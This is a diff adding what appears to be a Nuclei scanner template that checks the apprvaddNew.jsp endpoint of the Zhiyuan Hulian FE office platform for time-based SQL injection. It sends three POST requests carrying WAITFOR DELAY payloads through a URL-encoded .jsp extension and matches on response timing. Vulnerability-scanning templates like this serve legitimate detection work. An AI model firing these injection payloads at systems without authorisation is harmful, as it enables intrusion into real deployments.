@@ -1,0 +1,42 @@
+id: FE-apprvaddNew-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 致远互联FE协作办公平台apprvaddNew存在sql注入漏洞
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E8%87%B4%E8%BF%9C%E4%BA%92%E8%81%94FE%E5%8D%8F%E4%BD%9C%E5%8A%9E%E5%85%AC%E5%B9%B3%E5%8F%B0apprvaddNew%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /witapprovemanage/apprvaddNew.j%73p HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent:Mozilla/5.0 (WindowsNT10.0;Win64; x64) AppleWebKit/537.36 (KHTML, likeGecko)Chrome/96.0.4664.93Safari/537.36
+        Content-Type:application/x-www-form-urlencoded
+        Content-Length: 37
+
+        flowid=1';WAITFOR+DELAY+'0:0:3'--+---
+      - |-
+        POST /witapprovemanage/apprvaddNew.j%73p HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent:Mozilla/5.0 (WindowsNT10.0;Win64; x64) AppleWebKit/537.36 (KHTML, likeGecko)Chrome/96.0.4664.93Safari/537.36
+        Content-Type:application/x-www-form-urlencoded
+        Content-Length: 37
+
+        flowid=1';WAITFOR+DELAY+'0:0:6'--+---
+      - |-
+        POST /witapprovemanage/apprvaddNew.j%73p HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent:Mozilla/5.0 (WindowsNT10.0;Win64; x64) AppleWebKit/537.36 (KHTML, likeGecko)Chrome/96.0.4664.93Safari/537.36
+        Content-Type:application/x-www-form-urlencoded
+        Content-Length: 37
+
+        flowid=1';WAITFOR+DELAY+'0:0:9'--+---
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
